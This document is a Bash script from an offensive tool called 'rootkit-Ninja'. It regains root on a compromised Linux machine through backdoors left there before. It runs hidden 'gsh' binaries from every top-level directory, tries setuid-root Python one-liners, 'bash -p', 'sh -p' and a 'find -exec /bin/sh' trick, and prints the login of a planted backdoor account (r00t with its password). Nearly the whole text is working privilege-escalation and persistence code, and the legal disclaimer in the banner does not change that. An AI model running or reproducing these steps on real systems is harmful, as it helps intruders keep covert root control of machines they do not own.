#!/bin/bash

rampung='\033[0m'
abang='\033[1;31m'
ijo='\033[1;32m'
kuning='\033[1;33m'
putih='\033[1;37m'

banner(){
echo -ne "$putih
	       ___   ___  _   _    _ _          _   _ _       _       
	      / _ \ / _ \| | | |  (_) |        | \ | (_)     (_)      
	 _ __| | | | | | | |_| | ___| |_ ______|  \| |_ _ __  _  __ _ 
	| '__| | | | | | | __| |/ / | __|______| . \` | | '_ \| |/ _\` |
	| |  | |_| | |_| | |_|   <| | |_       | |\  | | | | | | (_| |
	|_|   \___/ \___/ \__|_|\_\_|\__|      |_| \_|_|_| |_| |\__,_|
	                                                    _/ |      
	                                                   |__/       
[+] Author		: Bayu Fedra
[+] Special Thanks 	: Reversing.ID - IndoXploit - Bashid.org - Backbox Linux Indonesia - Zerobyte.ID $kuning
[!] Important		: Make sure you have permisison to run this program
[!] legal disclaimer	: Usage of rootkit-Ninja without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
$putih
[+] Follow my Twitter/Instagram @bayufedraa :D
\n"
sleep 2
}

spawn_binary(){
	root_dir=$(ls /)
	for i in $root_dir
	do
		if [[ -d /$i ]]
		then
			echo -ne "$ijo[+] Spawn root with Binary Shell from Directory : $i$rampung\n"
			/$i/gsh
			/$i/.gsh
		fi
	done
}

spawn_py(){
	root_py=$(ls /usr/bin/python /usr/bin/python? /usr/bin/python???)
	for i in $root_py
	do
		echo -ne "$ijo[+] Spawn root with Python Version : $i$rampung\n"
		$i -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh"); os.system("/bin/bash")'
	done
}

spawn_app(){
	echo -ne "$ijo[+] Trying spawn using Bash...$rampung\n"
	bash -p
	echo -ne  "$ijo[+] Trying spawn using SH...$rampung\n"
	sh -p
	echo -ne "$ijo[+] Trying spawn using Find...$rampung\n"
	touch .,; find ., -exec /bin/sh \;
}

spawn_user(){
	echo -ne "$putih[+] If all root spawn doesn't work, you can try with user was you create before$rampung\n"
	echo -ne "$putih[+] If you forgot your user you can use default user rootkit ninja\n[+] Username : r00t\n[+] Password : r00tkitninja$rampung\n"
	echo -ne "$putih[+] G00D Luck :)$rampung\n"
}

banner
spawn_binary
spawn_py
spawn_app
spawn_user
